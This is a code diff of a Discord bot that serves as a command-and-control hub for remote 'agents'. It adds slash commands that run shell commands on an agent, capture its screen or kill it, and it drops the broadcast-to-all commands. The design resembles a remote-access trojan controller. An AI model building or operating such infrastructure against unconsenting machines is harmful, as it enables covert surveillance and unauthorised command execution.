@@ -1,13 +1,15 @@
 import discord
+from discord import app_commands
 from discord.ext import commands, tasks
 import os
 import asyncio
 from aiohttp import web
 from datetime import datetime, timezone, timedelta
 import re
+import time
 import logging
 
-# ------------------- CONFIGURATION (from environment) -------------------
+# ------------------- CONFIGURATION -------------------
 BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 GUILD_ID = int(os.getenv("DISCORD_GUILD_ID", 0))
 CONTROL_CHANNEL_NAME = os.getenv("CONTROL_CHANNEL", "control")
@@ -20,7 +22,7 @@ if not BOT_TOKEN:
 if not GUILD_ID:
     raise ValueError("DISCORD_GUILD_ID environment variable not set")
 
-# ------------------- LOGGING SETUP -------------------
+# ------------------- LOGGING -------------------
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
@@ -34,28 +36,21 @@ intents.message_content = True
 intents.guilds = True
 intents.messages = True
 
-bot = commands.Bot(command_prefix="!", intents=intents)
+class MyBot(commands.Bot):
+    def __init__(self):
+        super().__init__(command_prefix="!", intents=intents)
+        self.tree = app_commands.CommandTree(self)
 
-# ------------------- RATE LIMIT RETRY HELPER -------------------
-async def set_topic_with_retry(channel, topic, max_retries=3):
-    """Attempt to set channel topic, handling rate limits with exponential backoff."""
-    for attempt in range(max_retries):
-        try:
-            await channel.edit(topic=topic)
-            logger.info(f"✅ Topic set to '{topic}' in #{channel.name}")
-            return True
-        except discord.HTTPException as e:
-            if e.status == 429:
-                retry_after = int(e.response.headers.get("Retry-After", 5))
-                logger.warning(f"⏳ Rate limited (attempt {attempt+1}/{max_retries}), waiting {retry_after}s")
-                await asyncio.sleep(retry_after)
-            else:
-                logger.error(f"❌ HTTP error setting topic: {e.status} - {e.text}")
-                raise
-    logger.error(f"❌ Failed to set topic after {max_retries} attempts")
-    return False
+    async def setup_hook(self):
+        # Sync commands to the specific guild (instant)
+        guild = discord.Object(id=GUILD_ID)
+        self.tree.copy_global_to(guild=guild)
+        await self.tree.sync(guild=guild)
+        logger.info("Slash commands synced")
 
-# ------------------- HTTP HEALTH SERVER (for Render) -------------------
+bot = MyBot()
+
+# ------------------- HTTP HEALTH SERVER -------------------
 async def handle_health(request):
     return web.Response(text="OK")
 
@@ -123,16 +118,32 @@ async def on_ready():
             logger.info(f"Created #{CONTROL_CHANNEL_NAME} channel")
     clean_stale_agents.start()
 
-@bot.event
-async def on_message(message):
-    if message.author == bot.user:
-        return
-    if message.guild.id != GUILD_ID:
-        return
-    await bot.process_commands(message)
+# ------------------- SLASH COMMANDS -------------------
+async def send_command_to_agent(interaction: discord.Interaction, command_text: str):
+    """Send a command message to the agent's channel."""
+    channel = interaction.channel
+    if not channel.name.startswith(AGENT_CHANNEL_PREFIX):
+        await interaction.response.send_message("This command can only be used in an agent channel.", ephemeral=True)
+        return False
+    # Send a message that the agent will recognize
+    await channel.send(f"[CMD] {command_text}")
+    await interaction.response.send_message(f"✅ Command `{command_text}` sent to agent.", ephemeral=True)
+    return True
 
-# ------------------- CONTROL CHANNEL COMMANDS -------------------
-@bot.command(name="agents", help="List all active agents")
+@bot.tree.command(name="run", description="Execute a shell command on the agent")
+async def run_command(interaction: discord.Interaction, command: str):
+    await send_command_to_agent(interaction, f"run {command}")
+
+@bot.tree.command(name="screenshot", description="Capture a screenshot from the agent")
+async def screenshot_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "screenshot")
+
+@bot.tree.command(name="kill", description="Terminate the agent")
+async def kill_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "kill")
+
+# ------------------- CONTROL CHANNEL COMMANDS (optional, keep for backward compat) -------------------
+@bot.command(name="agents")
 async def list_agents(ctx):
     if ctx.channel.name != CONTROL_CHANNEL_NAME:
         await ctx.send("This command can only be used in the #control channel.")
@@ -151,71 +162,6 @@ async def list_agents(ctx):
         else:
             embed.add_field(name=f"#{ch.name}", value="No heartbeat", inline=False)
     await ctx.send(embed=embed)
-
-@bot.command(name="broadcast", help="Send a command to all agents")
-async def broadcast(ctx, *, command):
-    if ctx.channel.name != CONTROL_CHANNEL_NAME:
-        await ctx.send("This command can only be used in the #control channel.")
-        return
-    guild = ctx.guild
-    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
-    if not agent_channels:
-        await ctx.send("No agents to broadcast to.")
-        return
-    for ch in agent_channels:
-        await ch.edit(topic=f"cmd:run {command}")
-    await ctx.send(f"Broadcast command `{command}` to {len(agent_channels)} agents.")
-
-@bot.command(name="killall", help="Kill all agents")
-async def kill_all(ctx):
-    if ctx.channel.name != CONTROL_CHANNEL_NAME:
-        await ctx.send("This command can only be used in the #control channel.")
-        return
-    guild = ctx.guild
-    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
-    for ch in agent_channels:
-        await ch.edit(topic="cmd:kill")
-    await ctx.send(f"Kill signal sent to {len(agent_channels)} agents.")
-
-# ------------------- AGENT CHANNEL COMMAND LISTENER -------------------
-@bot.listen()
-async def on_message(message):
-    print(f"🔵 DEBUG: Message received in #{message.channel.name} from {message.author}: {message.content}")
-    if message.author == bot.user:
-        return
-    if message.guild.id != GUILD_ID:
-        return
-    if not message.channel.name.startswith(AGENT_CHANNEL_PREFIX):
-        return
-
-    content = message.content.strip()
-    logger.info(f"📩 Agent channel message: {content} in #{message.channel.name}")
-
-    try:
-        if content.startswith("!run "):
-            cmd = content[5:].strip()
-            success = await set_topic_with_retry(message.channel, f"cmd:run {cmd}")
-            if success:
-                await message.add_reaction("✅")
-            else:
-                await message.channel.send("❌ Failed to send command after retries.")
-        elif content == "!screenshot":
-            success = await set_topic_with_retry(message.channel, "cmd:screenshot")
-            if success:
-                await message.add_reaction("✅")
-            else:
-                await message.channel.send("❌ Failed to send command after retries.")
-        elif content == "!kill":
-            success = await set_topic_with_retry(message.channel, "cmd:kill")
-            if success:
-                await message.add_reaction("✅")
-            else:
-                await message.channel.send("❌ Failed to send command after retries.")
-        else:
-            logger.debug(f"Ignored non-command: {content}")
-    except Exception as e:
-        logger.exception(f"Unhandled exception in listener: {e}")
-        await message.channel.send("❌ Internal bot error.")
 
 # ------------------- MAIN -------------------
 async def main():
